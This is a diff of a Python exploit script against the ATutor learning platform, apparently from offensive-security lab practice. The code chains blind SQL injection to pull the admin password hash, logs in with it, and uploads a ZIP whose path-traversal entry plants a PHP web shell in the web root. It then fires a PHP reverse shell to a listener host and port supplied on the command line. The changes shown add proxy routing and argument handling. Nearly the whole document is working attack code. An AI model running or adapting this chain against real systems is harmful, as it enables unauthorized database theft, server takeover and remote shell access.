@@ -1,5 +1,10 @@
 import sys, requests, hashlib, zipfile, re, argparse
 
+proxies = {
+  "http": "http://127.0.0.1:8080",
+  "https": "https://127.0.0.1:8080",
+}
+
 def searchFriends(ip, injStr):
 	for i in range(32, 126):
 		target = "http://%s/mods/_standard/social/index_public.php?q=%s" % (ip, injStr.replace("[CHAR]", str(i)))
@@ -37,7 +42,7 @@ def generateHash(passwd, token):
 	m.update(passwd.encode('utf-8') + token.encode('utf-8'))
 	return m.hexdigest()
 
-def delivery(ip, user, hash):
+def delivery(ip, user, hash, lhost, lport):
 	# Session setup
 	s = requests.Session()
 	headers = {
@@ -46,7 +51,7 @@ def delivery(ip, user, hash):
 
 	# Craft ZIP file
 	z = zipfile.ZipFile("rce.zip", "w", zipfile.ZIP_DEFLATED)
-	path = '../../../poc/poc.phtml'
+	path = '../../../../../../../../../../var/www/html/ATutor/mods/rce/rce.phtml'
 	z.writestr(path, '<html><body><form method="GET" name="<?php echo basename($_SERVER[\'PHP_SELF\']); ?>"><input type="TEXT" name="cmd" autofocus id="cmd" size="80"><input type="SUBMIT" value="Execute"></form><pre><?php if(isset($_GET[\'cmd\'])){system($_GET[\'cmd\']);}?></pre></body></html>')
 	z.writestr('imsmanifest.xml', 'notxml')
 	z.close()
@@ -64,21 +69,17 @@ def delivery(ip, user, hash):
 	}
 	r = s.post(target, data=d, headers=headers)
 	res = r.text
-	if "Create Course: My Start Page" in res or "My Courses: My Start Page" in res:
-		usermatch = re.search(r'<strong>(.*?)<\/strong>\s*\|\s*<a href="\/logout\.php">Log-out<\/a>', res)
-		if usermatch:
-			output = usermatch.group(1)
-			print("\n\n[+] Login successful!")
-			print("[+] Logged in as:", output)
-		else:
-			print("[!] Login failed.")
-			sys.exit(-1)
+	if "You have logged in successfully." in res:
+		print("\n\n[+] Login successful!")
+	else:
+		print("\n\n[!] Login failed.")
+		sys.exit(-1)
 
 	# Walk simulator
 	deliveryTarget = "http://%s" % ip
-	s.get(deliveryTarget + "/bounce.php?course=1", headers=headers)
-	s.get(deliveryTarget + "/mods/_standard/tests/my_tests.php", headers=headers)
-	s.get(deliveryTarget + "/mods/_standard/tests/index.php", headers=headers)
+	s.get(deliveryTarget + "/bounce.php?course=16777215", headers=headers, proxies=proxies)
+	s.get(deliveryTarget + "/mods/_standard/tests/my_tests.php", headers=headers, proxies=proxies)
+	s.get(deliveryTarget + "/mods/_standard/tests/index.php", headers=headers, proxies=proxies)
 
 	# Actual File Upload process
 	headers = {
@@ -87,7 +88,7 @@ def delivery(ip, user, hash):
 	}
 	uploadFile = open('rce.zip', 'rb')
 	uploadTarget = "http://%s/mods/_standard/tests/import_test.php" % ip
-	fileUpload = s.post(uploadTarget, files = { "file" : ("rce.zip", uploadFile,'application/zip' ) }, data = {"submit_import" : "Import" }, headers=headers)
+	fileUpload = s.post(uploadTarget, files = { "file" : ("rce.zip", uploadFile,'application/zip' ) }, data = {"submit_import" : "Import" }, headers=headers, proxies=proxies)
 	result = fileUpload.text
 	if "XML error: Not well-formed" in result:
 		print("\n[+] Payload file successfully uploaded!")
@@ -96,23 +97,23 @@ def delivery(ip, user, hash):
 		sys.exit(-1)
 
 	# Remote Code Execution
-	print("\n[+] Insert the listener IP address:")
-	lhost = input()
-	print("\n[+] Insert the listener port:")
-	lport = input()
 	payload = "php -r '$sock=fsockopen(\"%s\",%s);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'" % (lhost, lport)
-	rce = "http://%s/poc/poc.phtml?cmd=%s" % (ip, payload)
+	rce = "http://%s/mods/rce/rce.phtml?cmd=%s" % (ip, payload)
 	s.get(rce, headers=headers)
 
 def main():
 	parser = argparse.ArgumentParser()
 	parser.add_argument('--ip', help='Target IP address', required=True)
+	parser.add_argument('--lhost', help='Local listener IP address', required=True)
+	parser.add_argument('--lport', help='Local listener port', required=True)
 	if len(sys.argv)<=1:
 		print("[!] Usage: python3 %s --ip 192.168.0.1:80/ATutor" % sys.argv[0])
 		parser.print_help()
 		sys.exit(-1)
 	args = parser.parse_args()
 	ip = args.ip
+	lhost = args.lhost
+	lport = args.lport
 
 	# Commented for better performance ;)
 	print("\n[+] Database version")
@@ -132,7 +133,7 @@ def main():
 	print(":", end = '')
 	query = "select/**/password/**/from/**/AT_members/**/where/**/status/**/=/**/3/**/limit/**/1"
 	adminHash = inject(query, ip)
-	delivery(ip, adminUser, adminHash)
+	delivery(ip, adminUser, adminHash, lhost, lport)
 
 if __name__ == "__main__":
 	main()
